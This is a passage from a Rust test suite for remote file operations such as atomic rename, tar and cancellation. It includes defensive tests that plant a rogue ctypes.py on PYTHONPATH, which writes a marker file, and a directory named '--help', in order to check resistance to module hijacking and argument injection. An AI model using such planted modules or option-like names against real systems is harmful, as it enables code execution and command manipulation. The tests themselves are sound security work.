            nix::libc::EXDEV,
        ] {
            std::fs::write(root.0.join("ctypes.py"),format!("c_int = c_char_p = c_uint = int\nclass Function:\n def __call__(self, *args): return -1\nclass CDLL:\n renameat2 = Function()\n def __init__(self, *args, **kwargs): assert kwargs.get('use_errno') is True\ndef get_errno(): return {errno}\n")).unwrap();
            let result = capture(
                &[
                    "/usr/bin/env",
                    &path,
                    "python3",
                    "-B",
                    "-c",
                    atomic_program(),
                    "publish",
                    src.to_str().unwrap(),
                    dst.to_str().unwrap(),
                ],
                b"",
                Duration::from_secs(5),
            )
            .unwrap();
            assert_eq!(code(&result), 4);
            assert_eq!(std::fs::read(&src).unwrap(), b"source");
            assert_eq!(std::fs::read(&dst).unwrap(), b"keep");
        }
    }
    #[test]
    fn remote_atomic_rename_ignores_untrusted_python_import_paths() {
        let root = Temp::new();
        let src = root.0.join("source");
        let dst = root.0.join("target");
        let marker = root.0.join("executed");
        std::fs::write(&src, b"source").unwrap();
        std::fs::write(
            root.0.join("ctypes.py"),
            format!("open({:?}, 'w').write('bad')\n", marker.to_str().unwrap()),
        )
        .unwrap();
        let path = format!("PYTHONPATH={}", root.0.display());
        let result = capture(
            &[
                "/usr/bin/env",
                &path,
                "sh",
                "-c",
                PROBE_SCRIPT,
                "probe",
                "mv",
                src.to_str().unwrap(),
                dst.to_str().unwrap(),
            ],
            b"",
            Duration::from_secs(5),
        )
        .unwrap();
        assert_eq!(code(&result), 0);
        assert_eq!(std::fs::read(dst).unwrap(), b"source");
        assert!(!marker.exists());
    }
    #[test]
    fn remote_tar_treats_option_like_basename_as_a_name() {
        let root = Temp::new();
        let source = root.0.join("--help");
        std::fs::create_dir(&source).unwrap();
        std::fs::write(source.join("kept"), b"data").unwrap();
        let result = probe(PROBE_SCRIPT, &["tar", source.to_str().unwrap()], b"");
        assert_eq!(code(&result), 0);
        assert!(result.stdout.len() > 512);
        assert_eq!(&result.stdout[257..262], b"ustar");
    }
    #[test]
    fn cancelled_home_lookup_rejects_before_endpoint_resolution_or_spawn() {
        let cancellation = CancelToken::default();
        cancellation.cancel();
        let error = start_dir_with_overlay_cancel(
            &FsLocation::Remote(usize::MAX),
            &[],
            &FsExecutionOverlay::default(),
            &cancellation,
        )
        .unwrap_err();
        assert_eq!(error.kind(), io::ErrorKind::Interrupted);
    }
}
